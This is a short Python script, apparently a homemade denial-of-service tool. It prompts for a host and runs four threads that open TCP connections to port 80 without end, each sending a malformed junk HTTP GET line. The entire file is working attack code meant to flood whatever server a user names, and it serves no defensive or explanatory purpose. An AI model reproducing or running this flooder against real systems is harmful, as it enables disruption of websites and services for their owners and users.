import socket
from threading import Thread
host = input("Enter a host: ")
target = socket.gethostbyname(host)
port = 80
def ddos():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
            try:
                mysocket.connect((target, port))
                #random scheiß daten
                mysocket.send(str.encode("GET " + "gitn3xus" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "gitn3xus" + "HTTP/1.1 \r\n"), (target, port))
            except socket.error:
                print("error")
        mysocket.close()
for i in range(4):
    t = Thread(target=ddos)
    t.start()

